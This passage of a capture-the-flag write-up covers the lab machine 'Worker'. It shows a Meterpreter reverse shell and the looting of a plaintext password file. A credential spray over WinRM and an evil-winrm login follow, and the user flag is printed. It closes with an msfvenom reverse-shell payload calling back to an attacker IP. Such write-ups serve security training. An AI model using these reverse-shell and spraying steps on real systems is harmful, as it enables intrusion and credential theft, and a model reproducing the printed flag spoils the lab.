on 10.10.14.174:9999</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Sending stage (201283 bytes) to 10.10.10.203</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Meterpreter session 1 opened (10.10.14.174:9999 -&gt; 10.10.10.203:55557) at 2020-10-21 20:33:24 +0200</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Access the reverse shell &amp; enjoy the meterpreter <a href="http://alpha.worker.htb/assets/cyfun.aspx" target="_blank" rel="noopener noreferrer">http://alpha.worker.htb/assets/cyfun.aspx</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl">Privilege Escalation of Machine : from iis apppool\defaultapppool to robisl<a href="#privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from iis apppool\defaultapppool to robisl" title="Direct link to Privilege Escalation of Machine : from iis apppool\defaultapppool to robisl">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Process 8920 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Channel 1 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 10.0.17763.1282]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(c) 2018 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">iis apppool\defaultapppool</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s <a href="https://superuser.com/questions/139899/see-available-drives-from-windows-cli" target="_blank" rel="noopener noreferrer">list the available drives</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;wmic logicaldisk get volumename,name,caption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Caption  Name  VolumeName</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:       C:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">W:       W:    Work</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;fsutil fsinfo drives</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Drives: C:\ W:\</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have an unusual drive with label W:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;ls w:\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">AzureDevOpsData</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">System Volume Information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sites</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">svnrepos</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Using a <a href="https://guif.re/windowseop#pe%203:%20ClearText%20passwords%20(quick%20hits)" target="_blank" rel="noopener noreferrer">Guifre</a> technique to quickly loot password I found a promising file:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;dir w:\ /s /b | findstr /si pass*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">w:\svnrepos\www\conf\passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\windows\system32\inetsrv&gt;cat w:\svnrepos\www\conf\passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">### This file is an example password file for svnserve.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">### Its format is similar to that of svnserve.conf. As shown in the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">### example below it contains one section labelled [users].</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">### The name and password for each user follow, one account per line.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[users]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nathen = wendel98</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nichin = fqerfqerf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nichin = asifhiefh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">noahip = player</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nuahip = wkjdnw</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">oakhol = bxwdjhcue</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">owehol = supersecret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">paihol = painfulcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">parhol = gitcommit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pathop = iliketomoveit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pauhor = nowayjose</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">payhos = icanjive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">perhou = elvisisalive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">peyhou = ineedvacation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">phihou = pokemon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">quehub = pickme</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">quihud = kindasecure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rachul = guesswho</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">raehun = idontknow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ramhun = thisis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ranhut = getting</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rebhyd = rediculous</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reeinc = iagree</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reeing = tosomepoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reiing = isthisenough</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">renipr = dummy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rhiire = users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">riairv = canyou</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ricisa = seewhich</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">robish = onesare</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">robisl = wolves11</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">robive = andwhich</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ronkay = onesare</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rubkei = the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rupkel = sheeps</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ryakel = imtired</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sabken = drjones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">samken = aqua</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sapket = hamburger</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sarkil = friday</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Wow tons of creds.</p><p>Let&#x27;s put username and password in files.</p><p>I&#x27;ll use <!-- -->[crackmaexec][cme]<!-- --> for password spraying.</p><blockquote><p>--no-bruteforce - No spray when using file for username and password (user1 =&gt; password1, user2 =&gt; password2</p><p>  --continue-on-success - continues authentication attempts even after successes</p></blockquote><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cme winrm 10.10.10.203 --no-bruteforce -u usernames.txt -p passwords.txt --continue-on-success</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [*] None (name:10.10.10.203) (domain:None)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [*] http://10.10.10.203:5985/wsman</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\nathen:wendel98</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\nichin:fqerfqerf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\nichin:asifhiefh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\noahip:player</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\nuahip:wkjdnw</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\oakhol:bxwdjhcue</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\owehol:supersecret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\paihol:painfulcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\parhol:gitcommit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\pathop:iliketomoveit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\pauhor:nowayjose</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\payhos:icanjive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\perhou:elvisisalive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\peyhou:ineedvacation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\phihou:pokemon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\quehub:pickme</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\quihud:kindasecure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\rachul:guesswho</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\raehun:idontknow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\ramhun:thisis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\ranhut:getting</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\rebhyd:rediculous</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\reeinc:iagree</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\reeing:tosomepoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\reiing:isthisenough</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\renipr:dummy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\rhiire:users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\riairv:canyou</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\ricisa:seewhich</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\robish:onesare</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\robive:andwhich</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\ronkay:onesare</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\rubkei:the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\rupkel:sheeps</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\ryakel:imtired</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\sabken:drjones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\samken:aqua</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\sapket:hamburger</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.203    5985   NONE             [-] None\sarkil:friday</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we have only one set of valid credentials: <code>robisl:wolves11</code>.</p><p>Now let&#x27;s connect with <!-- -->[evil-winrm][evil-winrm]<!-- -->:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Evil-WinRM shell v2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\robisl\Documents&gt; cd ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\robisl&gt; gc Desktop/user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">571ead91c15070e615b5882f25bad03d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-robisl-to-administrator">Privilege Escalation of Machine : from robisl to Administrator<a href="#privilege-escalation-of-machine--from-robisl-to-administrator" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from robisl to Administrator" title="Direct link to Privilege Escalation of Machine : from robisl to Administrator">​</a></h2><p>We can enumerate a bit but there is nothing more we can see with robisl than
we were able to see with the IIS account.</p><p>So lets go back to <a href="http://devops.worker.htb" target="_blank" rel="noopener noreferrer">http://devops.worker.htb</a>, sign out and sign in back as
robisl.</p><p>Now we can see a different project than earlier:
<a href="http://devops.worker.htb/ekenas/PartsUnlimited" target="_blank" rel="noopener noreferrer">http://devops.worker.htb/ekenas/PartsUnlimited</a></p><p>This time we don&#x27;t have a PartsUnlimited sub-domain, there is a lot of files in
the repository but nothing seems useful.</p><p>As an everyday user of GitLab I know I can run some tests in a docker thanks
to the integrated GitLab CI pipeline (no need to configure an external CI) that
yo ucan configure through <code>.gitlab-ci.yml</code>.</p><p>It seems Azure Devops has a similar feature: New Pipeline &gt; Azure Repos Git &gt; PartsUnlimited &gt; Starter Pipeline &gt; <code>azure-pipelines.yml</code>.</p><p>We are welcomed with a default template:</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Starter pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start with a minimal pipeline that you can customize to build and deploy your code.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add steps that build, run tests, deploy, and more:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># https://aka.ms/yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">trigger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">pool</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Default&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">steps</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token key atrule">script</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> echo Hello</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> world</span><span class="token tag" style="color:rgb(255, 121, 198)">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">displayName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Run a one-line script&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token key atrule">script</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">|</span><span class="token scalar string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token scalar string" style="color:rgb(255, 121, 198)">    echo Add other tasks to build, test, and deploy your project.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token scalar string" style="color:rgb(255, 121, 198)">    echo See https://aka.ms/yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">displayName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Run a multi-line script&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s create a new reverse shell (an exe this time).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw &gt; cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Found 1 compatible encoders</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Attempting to encode payload with 1 iterations of generic/none</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none succeeded with size 510 (iteration=0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none chosen with final size 510</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload size: 510 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Start a listener aagain:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(multi/handler) &gt; options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (exploit/multi/handler):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name  Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----  